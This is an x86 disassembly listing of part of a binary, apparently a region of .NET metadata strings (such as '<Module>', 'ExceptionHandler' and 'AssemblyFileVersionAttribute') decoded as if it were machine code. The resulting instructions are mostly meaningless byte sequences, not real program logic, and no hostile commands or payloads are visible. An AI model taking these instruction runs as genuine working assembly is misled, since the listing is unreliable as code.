  4026c0:	add    al,0x0
  4026c2:	ja     0x4026e6
  4026c4:	add    BYTE PTR [eax],al
  4026c6:	add    BYTE PTR [eax],al
  4026c8:	xchg   BYTE PTR [eax],bl
  4026ca:	mov    DWORD PTR [ecx],eax
  4026cc:	jns    0x4026ce
  4026ce:	add    eax,0x227f00
  4026d3:	add    BYTE PTR [eax],al
  4026d5:	add    BYTE PTR [esi-0x7efe76e8],al
  4026db:	add    BYTE PTR ds:0x229000,al
  4026e1:	add    BYTE PTR [eax],al
  4026e3:	add    dh,ah
  4026e5:	add    DWORD PTR [edi+0x6008701],esp
  4026eb:	add    BYTE PTR [eax+0x23],bl
  4026ee:	add    BYTE PTR [eax],al
  4026f0:	add    BYTE PTR [eax],al
  4026f2:	xchg   esi,eax
  4026f3:	add    BYTE PTR [edx+0x7008d01],bh
  4026f9:	add    BYTE PTR [eax],al
  4026fb:	add    BYTE PTR [eax],al
  4026fd:	add    BYTE PTR [eax],al
  4026ff:	add    BYTE PTR [esi-0x44fdd9e0],dl
  402705:	add    BYTE PTR [edi],al
  402707:	add    BYTE PTR [eax+0x23],al
  40270d:	add    BYTE PTR [esi-0xbfd8e00],dl
  402713:	add    eax,0x8
  402718:	add    DWORD PTR [eax],eax
  40271a:	jg     0x40271e
  40271c:	add    BYTE PTR [eax],al
  40271e:	add    DWORD PTR [eax],eax
  402720:	jg     0x402724
  402722:	add    BYTE PTR [eax],al
  402724:	add    DWORD PTR [eax],eax
  402726:	jg     0x40272a
  402728:	add    BYTE PTR [eax],al
  40272a:	add    DWORD PTR [eax],eax
  40272c:	test   BYTE PTR [edx],al
  40272e:	add    BYTE PTR [eax],al
  402730:	add    DWORD PTR [eax],eax
  402732:	pop    DWORD PTR [ecx]
  402734:	add    BYTE PTR [eax],al
  402736:	add    DWORD PTR [eax],eax
  402738:	mov    al,BYTE PTR [edx]
  40273a:	add    BYTE PTR [eax],al
  40273c:	add    DWORD PTR [eax],eax
  40273e:	xchg   esp,eax
  40273f:	add    al,BYTE PTR [eax]
  402741:	add    BYTE PTR [ecx],al
  402743:	add    BYTE PTR [edx+eax*1+0x90004],bl
  40274a:	cmp    DWORD PTR [eax],eax
  40274c:	mov    DWORD PTR [ecx],eax
  40274e:	cli    
  40274f:	add    eax,0x1890041
  402754:	cli    
  402755:	add    eax,0x1890049
  40275a:	cli    
  40275b:	add    eax,0x1890051
  402760:	cli    
  402761:	add    eax,0x1890059
  402766:	cli    
  402767:	add    eax,0x1890061
  40276c:	cli    
  40276d:	add    eax,0x1890069
  402772:	cli    
  402773:	add    eax,0x1890071
  402778:	cli    
  402779:	add    eax,0x1890079
  40277e:	cli    
  40277f:	add    eax,0x1890081
  402784:	cli    
  402785:	add    eax,0x1890089
  40278a:	inc    DWORD PTR ds:0x1890099
  402790:	add    eax,0x8900a106
  402795:	add    DWORD PTR [ecx+0x0],edi
  402798:	test   eax,0x79018900
  40279d:	add    BYTE PTR [ecx-0x53fb5500],dh
  4027a3:	push   es
  4027a4:	mov    ecx,0xb2018900
  4027a9:	push   es
  4027aa:	mov    cl,0x0
  4027ac:	jmp    0xb946dfb5
  4027b1:	add    bl,bh
  4027b3:	add    al,0x74
  4027b5:	add    cl,al
  4027b7:	add    BYTE PTR [edx],ch
  4027b9:	add    eax,0xc906c4
  4027be:	jle    0x4027c5
  4027c0:	enter  0xd906,0x0
  4027c4:	lea    eax,ds:0xe106cf
  4027ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027cb:	add    eax,0x1406d5
  4027d0:	lods   al,BYTE PTR ds:[esi]
  4027d1:	add    eax,0x3106df
  4027d6:	mov    ecx,0xe906e305
  4027db:	add    ah,ah
  4027dd:	add    eax,0x1406e8
  4027e2:	mov    DWORD PTR [ecx],eax
  4027e4:	out    dx,eax
  4027e5:	push   es
  4027e6:	stc    
  4027e7:	add    BYTE PTR [ecx+0x1007901],cl
  4027ed:	add    DWORD PTR [ecx+0x1106f501],ecx
  4027f3:	add    DWORD PTR [ecx+0x6],esp
  4027f6:	std    
  4027f7:	push   es
  4027f8:	sbb    DWORD PTR [ecx],eax
  4027fa:	mov    DWORD PTR [ecx],eax
  4027fc:	add    al,BYTE PTR [edi]
  4027fe:	sbb    DWORD PTR [ecx],eax
  402800:	ins    BYTE PTR es:[edi],dx
  402801:	push   es
  402802:	or     BYTE PTR [edi],al
  402804:	sbb    DWORD PTR [ecx],eax
  402806:	jge    0x40280e
  402808:	je     0x40280a
  40280a:	adc    al,0x0
  40280c:	add    DWORD PTR [esi],0xd
  40280f:	pop    es
  402810:	and    DWORD PTR [ecx],eax
  402812:	mov    DWORD PTR [ecx],eax
  402814:	adc    al,BYTE PTR [edi]
  402816:	and    DWORD PTR [ecx],eax
  402818:	ins    DWORD PTR es:[edi],dx
  402819:	add    DWORD PTR [ecx+0x0],edi
  40281c:	xor    DWORD PTR [ecx],eax
  40281e:	mov    bl,0x6
  402820:	xor    eax,DWORD PTR [edi]
  402822:	cmp    DWORD PTR [ecx],eax
  402824:	mov    BYTE PTR [esi],0x8d
  402827:	add    cl,dl
  402829:	add    dh,al
  40282b:	push   es
  40282c:	jns    0x40282e
  40282e:	inc    ecx
  40282f:	add    edi,edx
  402831:	push   es
  402832:	cmp    al,BYTE PTR [edi]
  402834:	xor    DWORD PTR [ecx],eax
  402836:	fild   WORD PTR [esi]
  402838:	jns    0x40283a
  40283a:	inc    ecx
  40283b:	add    esp,ebp
  40283d:	push   es
  40283e:	jns    0x402840
  402840:	dec    ecx
  402841:	add    esi,edi
  402843:	push   es
  402844:	aas    
  402845:	pop    es
  402846:	or     DWORD PTR [eax],eax
  402848:	mov    DWORD PTR [ecx],eax
  40284a:	jns    0x40284c
  40284c:	pop    ecx
  40284d:	add    DWORD PTR [ecx+0x59074b01],ecx
  402853:	add    DWORD PTR [edi+eax*1+0x51],eax
  402857:	pop    es
  402858:	leave  
  402859:	add    BYTE PTR [edx+0x61075507],bl
  40285f:	add    DWORD PTR [esi+0x61076207],esp
  402865:	add    DWORD PTR [esi+0x79074b07],esp
  40286b:	add    DWORD PTR [esi-0x2eff86f9],esi
  402871:	add    ah,ch
  402873:	push   es
  402874:	jns    0x402876
  402876:	cmp    DWORD PTR [ecx],eax
  402878:	in     al,dx
  402879:	push   es
  40287a:	lea    eax,[eax]
  40287c:	add    DWORD PTR [ecx],0x76f07ed
  402882:	add    DWORD PTR [ecx],0x77407f6
  402888:	xchg   ecx,eax
  402889:	add    DWORD PTR [ecx-0x66ff86ff],ecx
  40288f:	add    DWORD PTR [ecx+0x3105fa01],ecx
  402895:	add    BYTE PTR [ecx-0x5efa05ff],cl
  40289b:	add    DWORD PTR [eax],edi
  40289d:	or     BYTE PTR [eax+0x4301a107],al
  4028a3:	or     BYTE PTR [edx+0x4000e07],cl
  4028a9:	add    BYTE PTR [esi],dl
  4028ab:	add    BYTE PTR [ecx],cl
  4028ad:	add    BYTE PTR [eax+eax*1],dl
  4028b0:	cwde   
  4028b1:	add    BYTE PTR [ecx],cl
  4028b3:	add    BYTE PTR [eax],bl
  4028b5:	add    BYTE PTR [ebp+0x1c000900],bl
  4028bb:	add    BYTE PTR [edx+0x20000900],ah
  4028c1:	add    BYTE PTR [edi+0x24000900],ah
  4028c7:	add    BYTE PTR [eax+eax*1+0x280009],ch
  4028ce:	mov    cl,0x0
  4028d0:	or     DWORD PTR [eax],eax
  4028d2:	sub    al,0x0
  4028d4:	mov    dh,0x0
  4028d6:	push   cs
  4028d7:	add    BYTE PTR [eax],dh
  4028d9:	add    al,al
  4028db:	add    BYTE PTR [esi],cl
  4028dd:	add    BYTE PTR [eax+eax*1],dh
  4028e0:	pop    edx
  4028e1:	add    esp,DWORD PTR [eax]
  4028e3:	add    BYTE PTR [ebx+0x0],dh
  4028e6:	popf   
  4028e7:	add    BYTE PTR [esi],ch
  4028e9:	add    BYTE PTR [ebx],dh
  4028eb:	add    BYTE PTR [edx],bl
  4028ed:	or     BYTE PTR [esi],ch
  4028ef:	add    BYTE PTR [ebx],dl
  4028f1:	add    BYTE PTR [edi+0x1b002e07],dl
  4028f7:	add    BYTE PTR [edx+0x23002e07],ch
  4028fd:	add    bl,cl
  4028ff:	pop    es
  402900:	add    BYTE PTR cs:[ebx],ch
  402903:	add    dh,ah
  402905:	pop    es
  402906:	add    BYTE PTR cs:[ebx+0x0],dl
  40290a:	into   
  40290b:	or     BYTE PTR [esi],ch
  40290d:	add    BYTE PTR [ebx+0x0],ch
  402910:	or     ecx,DWORD PTR [ecx]
  402912:	add    BYTE PTR cs:[ebx+0x0],cl
  402916:	ret    
  402917:	or     BYTE PTR [esi],ch
  402919:	add    BYTE PTR [ebx],bh
  40291b:	add    BYTE PTR [ebx+0x5b002e08],ah
  402921:	add    cl,bh
  402923:	or     BYTE PTR [esi],ch
  402925:	add    BYTE PTR [ebx+0x0],ah
  402928:	add    cl,BYTE PTR [ecx]
  40292a:	ret    
  40292b:	add    BYTE PTR [ebx-0x40ff62ff],dh
  402931:	push   es
  402932:	sbb    eax,0x68074407
  402937:	pop    es
  402938:	jnp    0x402941
  40293a:	xchg   ecx,eax
  40293b:	pop    es
  40293c:	and    cl,BYTE PTR [eax]
  40293e:	int3   
  40293f:	push   es
  402940:	fld    DWORD PTR [esi]
  402942:	add    BYTE PTR [ecx],al
  402944:	adc    eax,DWORD PTR [eax]
  402946:	add    al,BYTE PTR es:[ecx]
  402949:	add    BYTE PTR [eax+eax*4],al
  40294c:	add    BYTE PTR [eax],al
  40294e:	add    DWORD PTR [eax],eax
  402950:	add    BYTE PTR [eax],al
  402952:	add    BYTE PTR [eax],al
  402954:	add    BYTE PTR [eax],al
  402956:	add    DWORD PTR [eax],eax
  402958:	add    BYTE PTR [eax],al
  40295a:	or     al,BYTE PTR [esi]
  40295c:	xor    eax,DWORD PTR [eax]
  40295e:	add    BYTE PTR [eax],al
  402960:	add    al,BYTE PTR [eax]
	...
  40296a:	add    BYTE PTR [eax],al
  40296c:	add    DWORD PTR [eax],eax
  40296e:	into   
  40296f:	add    BYTE PTR [eax],al
  402971:	add    BYTE PTR [eax],al
  402973:	add    BYTE PTR [ecx],al
	...
  40297d:	add    BYTE PTR [eax],al
  40297f:	add    BYTE PTR [edx],cl
  402981:	add    ch,ah
  402983:	add    BYTE PTR [eax],al
  402985:	add    BYTE PTR [eax],al
  402987:	add    BYTE PTR [ebx],al
  402989:	add    BYTE PTR ds:0x0,al
  40298f:	add    BYTE PTR [eax],al
  402991:	add    BYTE PTR [eax],al
  402993:	add    BYTE PTR [ecx],al
  402995:	add    BYTE PTR [esi+eax*1],al
  402998:	add    BYTE PTR [eax],al
  40299a:	add    BYTE PTR [eax],al
  40299c:	add    al,BYTE PTR [eax]
	...
  4029a6:	add    BYTE PTR [eax],al
  4029a8:	add    DWORD PTR [eax],eax
  4029aa:	xlat   BYTE PTR ds:[ebx]
  4029ab:	add    BYTE PTR [eax],al
  4029ad:	add    BYTE PTR [eax],al
  4029af:	add    BYTE PTR [eax+eax*1],al
  4029b2:	add    eax,DWORD PTR [eax]
  4029b4:	push   es
  4029b5:	add    BYTE PTR ds:0x5000700,al
  4029bb:	add    BYTE PTR [eax],al
  4029bd:	add    BYTE PTR [eax],al
  4029bf:	add    BYTE PTR [eax],al
  4029c1:	cmp    al,0x4d
  4029c3:	outs   dx,DWORD PTR ds:[esi]
  4029c4:	fs jne 0x402a33
  4029c7:	gs add BYTE PTR ds:[ebp+0x69],cl
  4029cc:	arpl   WORD PTR [edx+0x6f],si
  4029cf:	jae    0x402a40
  4029d1:	data16 je 0x402a02
  4029d4:	dec    ebp
  4029d5:	popa   
  4029d6:	jae    0x402a40
  4029d8:	jne    0x402a4a
  4029da:	cs inc ebx
  4029dc:	outs   dx,DWORD PTR ds:[esi]
  4029dd:	outs   dx,BYTE PTR ds:[esi]
  4029de:	je     0x402a41
  4029e0:	imul   ebp,DWORD PTR [esi+0x65],0x78652e72
  4029e7:	add    BYTE PTR gs:[ebx+0x6f],al
  4029eb:	outs   dx,BYTE PTR ds:[esi]
  4029ec:	jae    0x402a62
  4029ee:	popa   
  4029ef:	outs   dx,BYTE PTR ds:[esi]
  4029f0:	je     0x402a65
  4029f2:	add    BYTE PTR [ebp+0x69],cl
  4029f5:	arpl   WORD PTR [edx+0x6f],si
  4029f8:	jae    0x402a69
  4029fa:	data16 je 0x402a2b
  4029fd:	dec    ebp
  4029fe:	popa   
  4029ff:	jae    0x402a69
  402a01:	jne    0x402a73
  402a03:	cs inc ebx
  402a05:	outs   dx,DWORD PTR ds:[esi]
  402a06:	outs   dx,BYTE PTR ds:[esi]
  402a07:	je     0x402a6a
  402a09:	imul   ebp,DWORD PTR [esi+0x65],0x76450072
  402a10:	popa   
  402a11:	ins    BYTE PTR es:[edi],dx
  402a12:	jne    0x402a75
  402a14:	je     0x402a7f
  402a16:	outs   dx,DWORD PTR ds:[esi]
  402a17:	outs   dx,BYTE PTR ds:[esi]
  402a18:	inc    ebx
  402a19:	outs   dx,DWORD PTR ds:[esi]
  402a1a:	outs   dx,BYTE PTR ds:[esi]
  402a1b:	je     0x402a7e
  402a1d:	imul   ebp,DWORD PTR [esi+0x65],0x69614d72
  402a24:	outs   dx,BYTE PTR ds:[esi]
  402a25:	add    BYTE PTR [ebp+0x78],al
  402a28:	arpl   WORD PTR [ebp+0x70],sp
  402a2b:	je     0x402a96
  402a2d:	outs   dx,DWORD PTR ds:[esi]
  402a2e:	outs   dx,BYTE PTR ds:[esi]
  402a2f:	dec    eax
  402a30:	popa   
  402a31:	outs   dx,BYTE PTR ds:[esi]
  402a32:	fs ins BYTE PTR es:[edi],dx
  402a34:	gs jb  0x402a37
  402a37:	push   edi
  402a38:	imul   ebp,DWORD PTR [esi+0x64],0x4573776f
  402a3f:	jb     0x402ab3
  402a41:	outs   dx,DWORD PTR ds:[esi]
  402a42:	jb     0x402a96
  402a44:	gs jo  0x402ab6
  402a47:	jb     0x402abd
  402a49:	imul   ebp,DWORD PTR [esi+0x67],0x6e695700
  402a50:	outs   dx,DWORD PTR fs:[esi]
  402a52:	ja     0x402ac7
  402a54:	inc    ebp
  402a55:	jb     0x402ac9
  402a57:	outs   dx,DWORD PTR ds:[esi]
  402a58:	jb     0x402aac
  402a5a:	gs jo  0x402acc
  402a5d:	jb     0x402ad3
  402a5f:	imul   ebp,DWORD PTR [esi+0x67],0x67616c46
  402a66:	jae    0x402a68
  402a68:	dec    esi
  402a69:	popa   
  402a6a:	je     0x402ad5
  402a6c:	jbe    0x402ad3
  402a6e:	dec    ebp
  402a6f:	gs je  0x402ada
  402a72:	outs   dx,DWORD PTR ds:[esi]
  402a73:	fs jae 0x402a76
  402a76:	inc    ecx
  402a77:	jae    0x402aec
  402a79:	gs ins DWORD PTR es:[edi],dx
  402a7b:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  402a7f:	data16 add BYTE PTR gs:[edx+0x65],dl
  402a84:	ins    BYTE PTR es:[edi],dx
  402a85:	gs popa 
  402a87:	jae    0x402aee
  402a89:	dec    ecx
  402a8a:	outs   dx,BYTE PTR ds:[esi]
  402a8b:	outs   dx,WORD PTR ds:[esi]
  402a8d:	add    BYTE PTR [ebp+0x73],ch
  402a90:	arpl   WORD PTR [edi+0x72],bp
  402a93:	ins    BYTE PTR es:[edi],dx
  402a94:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  402a9b:	gs ins DWORD PTR es:[edi],dx
  402a9d:	add    BYTE PTR [edi+0x62],cl
  402aa0:	push   0x65
  402aa2:	arpl   WORD PTR [eax+eax*1+0x4d],si
  402aa6:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402aad:	je     0x402add
  402aaf:	dec    ebp
  402ab0:	popa   
  402ab1:	jae    0x402b1b
  402ab3:	jne    0x402b25
  402ab5:	inc    ebp
  402ab6:	outs   dx,BYTE PTR ds:[esi]
  402ab7:	imul   ebp,DWORD PTR [bp+0x65],0x63694d00
  402abf:	jb     0x402b30
  402ac1:	jae    0x402b32
  402ac3:	data16 je 0x402af4
  402ac6:	dec    ebp
  402ac7:	popa   
  402ac8:	jae    0x402b32
  402aca:	jne    0x402b3c
  402acc:	cs inc ebp
  402ace:	jbe    0x402b31
  402ad0:	ins    BYTE PTR es:[edi],dx
  402ad1:	jne    0x402b34
  402ad3:	je     0x402b44
  402ad5:	jb     0x402b05
  402ad7:	dec    ecx
  402ad8:	outs   dx,BYTE PTR ds:[esi]
  402ad9:	je     0x402b40
  402adb:	jb     0x402b43
  402add:	popa   
  402ade:	arpl   WORD PTR [ebp+0x0],sp
  402ae1:	dec    ecx
  402ae2:	inc    ebp
  402ae3:	js     0x402b48
  402ae5:	gs jo  0x402b5c
  402ae8:	imul   ebp,DWORD PTR [edi+0x6e],0x646e6148
  402aef:	ins    BYTE PTR es:[edi],dx
  402af0:	gs jb  0x402b25
  402af3:	add    BYTE PTR [ebp+0x6e],al
  402af6:	jne    0x402b65
  402af8:	add    BYTE PTR [esi+0x69],al
  402afb:	ins    BYTE PTR es:[edi],dx
  402afc:	gs inc esp
  402afe:	gs jae 0x402b64
  402b01:	jb     0x402b6c
  402b03:	jo     0x402b79
  402b05:	imul   ebp,DWORD PTR [edi+0x6e],0x6c754e00
  402b0c:	ins    BYTE PTR es:[edi],dx
  402b0d:	popa   
  402b0e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x60]
  402b12:	xor    DWORD PTR [eax],eax
  402b14:	arpl   WORD PTR [edi+0x6e],bp
  402b17:	je     0x402b7a
  402b19:	imul   ebp,DWORD PTR [esi+0x65],0x444972
  402b20:	dec    ebp
  402b21:	popa   
  402b22:	imul   ebp,DWORD PTR [esi+0x0],0x65666153
  402b29:	push   edx
  402b2a:	jne    0x402b9a
  402b2c:	add    BYTE PTR [edx+0x75],dl
  402b2f:	outs   dx,BYTE PTR ds:[esi]
  402b30:	add    BYTE PTR [edi+0x61],dl
  402b33:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x72615072
  402b3b:	outs   dx,BYTE PTR gs:[esi]
  402b3d:	je     0x402b84
  402b3f:	js     0x402baa
  402b41:	je     0x402b97
  402b43:	push   0x64616572
  402b48:	add    BYTE PTR [esi],ch
  402b4a:	arpl   WORD PTR [edi+ebp*2+0x72],si
  402b4e:	add    BYTE PTR [ebx+0x6f],ah
  402b51:	outs   dx,BYTE PTR ds:[esi]
  402b52:	je     0x402bb5
  402b54:	imul   ebp,DWORD PTR [esi+0x65],0x69614d72
  402b5b:	outs   dx,BYTE PTR ds:[esi]
  402b5c:	add    BYTE PTR [ebp+0x78],al
  402b5f:	arpl   WORD PTR [ebp+0x70],sp
  402b62:	je     0x402bcd
  402b64:	outs   dx,DWORD PTR ds:[esi]
  402b65:	outs   dx,BYTE PTR ds:[esi]
  402b66:	add    BYTE PTR [edx+esi*2+0x79],dl
  402b6a:	dec    eax
  402b6b:	popa   
  402b6c:	outs   dx,BYTE PTR ds:[esi]
  402b6d:	fs ins BYTE PTR es:[edi],dx
  402b6f:	gs inc ebp
  402b71:	js     0x402bd6
  402b73:	gs jo  0x402bea
  402b76:	imul   ebp,DWORD PTR [edi+0x6e],0x73694400
  402b7d:	popa   
  402b7e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
  402b82:	jb     0x402be5
  402b84:	jae    0x402bee
  402b86:	inc    esp
  402b87:	imul   esp,DWORD PTR [ecx+0x6c],0x7600676f
  402b8e:	popa   
  402b8f:	ins    BYTE PTR es:[edi],dx
  402b90:	jne    0x402bf7
  402b92:	pop    edi
  402b93:	pop    edi
  402b94:	add    BYTE PTR [esi+0x6f],cl
  402b97:	outs   dx,BYTE PTR ds:[esi]
  402b98:	add    BYTE PTR gs:[esi+0x6f],cl
  402b9c:	dec    eax
  402b9d:	gs popa 
  402b9f:	add    BYTE PTR fs:[ecx+0x75],dl
  402ba3:	gs jne 0x402c0b
  402ba6:	add    BYTE PTR [ecx+ebp*2+0x73],al
  402baa:	popa   
  402bab:	bound  ebp,QWORD PTR [ebp+eiz*2+0x54]
  402baf:	push   0x64616572
  402bb4:	push   ebx
  402bb5:	jne    0x402c2a
  402bb7:	jo     0x402c1e
  402bb9:	outs   dx,BYTE PTR ds:[esi]
  402bba:	jae    0x402c25
  402bbc:	outs   dx,DWORD PTR ds:[esi]
  402bbd:	outs   dx,BYTE PTR ds:[esi]
  402bbe:	add    BYTE PTR [ecx+0x75],dl
  402bc1:	gs jne 0x402c29
  402bc4:	push   ebp
  402bc5:	jo     0x402c33
  402bc7:	outs   dx,DWORD PTR ds:[esi]
  402bc8:	popa   
  402bc9:	add    BYTE PTR fs:[ecx+0x6c],al
  402bcd:	ja     0x402c30
  402bcf:	jns    0x402c44
  402bd1:	push   ebx
  402bd2:	push   0x6955776f
  402bd7:	add    BYTE PTR [edx+0x65],dl
  402bda:	jo     0x402c4b
  402bdc:	jb     0x402c52
  402bde:	imul   ebp,DWORD PTR [esi+0x67],0x69556f4e
  402be5:	add    BYTE PTR [edi+0x65],dl
  402be8:	jb     0x402c3d
  402bea:	gs je  0x402c33
  402bed:	ins    BYTE PTR es:[edi],dx
  402bee:	popa   
  402bef:	addr16 jae 0x402bf2
  402bf2:	push   eax
  402bf3:	jb     0x402c64
  402bf5:	fs jne 0x402c5b
  402bf8:	je     0x402c4a
  402bfa:	jne    0x402c5e
  402bfc:	ins    BYTE PTR es:[edi],dx
  402bfd:	imul   esp,DWORD PTR [ebx+0x4b],0x54007965
  402c04:	gs jae 0x402c7b
  402c07:	push   eax
  402c08:	jne    0x402c6c
  402c0a:	ins    BYTE PTR es:[edi],dx
  402c0b:	imul   esp,DWORD PTR [ebx+0x4b],0x53007965
  402c12:	jns    0x402c87
  402c14:	je     0x402c7b
  402c16:	ins    DWORD PTR es:[edi],dx
  402c17:	cs inc edi
  402c19:	ins    BYTE PTR es:[edi],dx
  402c1a:	outs   dx,DWORD PTR ds:[esi]
  402c1b:	bound  esp,QWORD PTR [ecx+0x6c]
  402c1e:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  402c25:	add    BYTE PTR [ebx+0x75],al
  402c28:	ins    BYTE PTR es:[edi],dx
  402c29:	je     0x402ca0
  402c2b:	jb     0x402c92
  402c2d:	dec    ecx
  402c2e:	outs   dx,BYTE PTR ds:[esi]
  402c2f:	outs   dx,WORD PTR ds:[esi]
  402c31:	add    BYTE PTR [edi+0x65],al
  402c34:	je     0x402c83
  402c36:	outs   dx,DWORD PTR ds:[esi]
  402c37:	outs   dx,BYTE PTR ds:[esi]
  402c38:	je     0x402ca2
  402c3a:	pop    ecx
  402c3b:	gs popa 
  402c3d:	jb     0x402c3f
  402c3f:	popa   
  402c40:	jb     0x402ca9
  402c42:	jae    0x402c44
  402c44:	jae    0x402cba
  402c46:	popa   
  402c47:	je     0x402cae
  402c49:	add    BYTE PTR [ebp+0x78],ah
  402c4c:	arpl   WORD PTR [ebp+0x70],sp
  402c4f:	je     0x402cba
  402c51:	outs   dx,DWORD PTR ds:[esi]
  402c52:	outs   dx,BYTE PTR ds:[esi]
  402c53:	add    BYTE PTR [edi+esi*2+0x46],ah
  402c57:	ins    BYTE PTR es:[edi],dx
  402c58:	popa   
  402c59:	addr16 jae 0x402c5c
  402c5c:	arpl   WORD PTR [ebp+0x6c],si
  402c5f:	je     0x402cd6
  402c61:	jb     0x402cc8
  402c63:	add    BYTE PTR [ebx+0x79],dl
  402c66:	jae    0x402cdc
  402c68:	gs ins DWORD PTR es:[edi],dx
  402c6a:	cs push edx
  402c6c:	gs data16 ins BYTE PTR es:[edi],dx
  402c6f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402c74:	outs   dx,BYTE PTR ds:[esi]
  402c75:	add    BYTE PTR [ecx+0x73],al
  402c78:	jae    0x402cdf
  402c7a:	ins    DWORD PTR es:[edi],dx
  402c7b:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  402c7f:	gs jb  0x402cf5
  402c82:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402c89:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402c90:	jae    0x402d05
  402c92:	gs ins DWORD PTR es:[edi],dx
  402c94:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  402c98:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  402ca0:	outs   dx,DWORD PTR ds:[esi]
  402ca1:	outs   dx,BYTE PTR ds:[esi]
  402ca2:	inc    ecx
  402ca3:	je     0x402d19
  402ca5:	jb     0x402d10
  402ca7:	bound  esi,QWORD PTR [ebp+0x74]
  402caa:	add    BYTE PTR gs:[ecx+0x73],al
  402cae:	jae    0x402d15
  402cb0:	ins    DWORD PTR es:[edi],dx
  402cb1:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  402cb5:	outs   dx,BYTE PTR ds:[esi]
  402cb6:	outs   dx,WORD PTR ds:[esi]
  402cb8:	jb     0x402d27
  402cba:	popa   
  402cbb:	je     0x402d26
  402cbd:	outs   dx,DWORD PTR ds:[esi]
  402cbe:	outs   dx,BYTE PTR ds:[esi]
  402cbf:	popa   
  402cc0:	ins    BYTE PTR es:[edi],dx
  402cc1:	push   esi
  402cc2:	gs jb  0x402d38
  402cc5:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402ccc:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402cd3:	jae    0x402d48
  402cd5:	gs ins DWORD PTR es:[edi],dx
  402cd7:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  402cdb:	outs   dx,DWORD PTR ds:[esi]
  402cdc:	ins    DWORD PTR es:[edi],dx
  402cdd:	jo     0x402d40
  402cdf:	outs   dx,BYTE PTR ds:[esi]
  402ce0:	jns    0x402d23
  402ce2:	je     0x402d58
  402ce4:	jb     0x402d4f
  402ce6:	bound  esi,QWORD PTR [ebp+0x74]
  402ce9:	add    BYTE PTR gs:[ecx+0x73],al
  402ced:	jae    0x402d54
  402cef:	ins    DWORD PTR es:[edi],dx
  402cf0:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  402cf4:	outs   dx,DWORD PTR ds:[esi]
  402cf5:	jo     0x402d70
  402cf7:	jb     0x402d62
  402cf9:	addr16 push 0x74744174
  402cff:	jb     0x402d6a
  402d01:	bound  esi,QWORD PTR [ebp+0x74]
  402d04:	add    BYTE PTR gs:[ecx+0x73],al
  402d08:	jae    0x402d6f
  402d0a:	ins    DWORD PTR es:[edi],dx
  402d0b:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  402d0f:	jb     0x402d72
  402d11:	fs gs ins DWORD PTR es:[edi],dx
  402d14:	popa   
  402d15:	jb     0x402d82
  402d17:	inc    ecx
  402d18:	je     0x402d8e
  402d1a:	jb     0x402d85
  402d1c:	bound  esi,QWORD PTR [ebp+0x74]
  402d1f:	add    BYTE PTR gs:[ecx+0x73],al
  402d23:	jae    0x402d8a
  402d25:	ins    DWORD PTR es:[edi],dx
  402d26:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  402d2a:	jb     0x402d9b
  402d2c:	fs jne 0x402d92
  402d2f:	je     0x402d72
  402d31:	je     0x402da7
  402d33:	jb     0x402d9e
  402d35:	bound  esi,QWORD PTR [ebp+0x74]
  402d38:	add    BYTE PTR gs:[ecx+0x73],al
  402d3c:	jae    0x402da3
  402d3e:	ins    DWORD PTR es:[edi],dx
  402d3f:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  402d43:	jne    0x402db1
  402d45:	je     0x402dbc
  402d47:	jb     0x402dae
  402d49:	inc    ecx
  402d4a:	je     0x402dc0
  402d4c:	jb     0x402db7
  402d4e:	bound  esi,QWORD PTR [ebp+0x74]
  402d51:	add    BYTE PTR gs:[ebx+0x79],dl
  402d55:	jae    0x402dcb
  402d57:	gs ins DWORD PTR es:[edi],dx
  402d59:	cs push edx
  402d5b:	gs jae 0x402dcd
  402d5e:	jne    0x402dd2
  402d60:	arpl   WORD PTR [ebp+0x73],sp
  402d63:	add    BYTE PTR [esi+0x65],cl
  402d66:	jne    0x402ddc
  402d68:	jb     0x402dcb
  402d6a:	ins    BYTE PTR es:[edi],dx
  402d6b:	push   edx
  402d6c:	gs jae 0x402dde
  402d6f:	jne    0x402de3
  402d71:	arpl   WORD PTR [ebp+0x73],sp
  402d74:	dec    esp
  402d75:	popa   
  402d76:	outs   dx,BYTE PTR ds:[esi]
  402d77:	addr16 jne 0x402ddb
  402d7a:	addr16 gs inc ecx
  402d7d:	je     0x402df3
  402d7f:	jb     0x402dea
  402d81:	bound  esi,QWORD PTR [ebp+0x74]
  402d84:	add    BYTE PTR gs:[ecx+0x73],al
  402d88:	jae    0x402def
  402d8a:	ins    DWORD PTR es:[edi],dx
  402d8b:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  402d8f:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  402d97:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  402d9e:	jns    0x402e13
  402da0:	je     0x402e07
  402da2:	ins    DWORD PTR es:[edi],dx
  402da3:	cs inc esp
  402da5:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  402dac:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  402db3:	jne    0x402e1c
  402db5:	addr16 popa 
  402db7:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  402dbb:	je     0x402e31
  402dbd:	jb     0x402e28
  402dbf:	bound  esi,QWORD PTR [ebp+0x74]
  402dc2:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  402dc7:	jne    0x402e30
  402dc9:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  402dd1:	jae    0x402dd3
  402dd3:	push   ebx
  402dd4:	jns    0x402e49
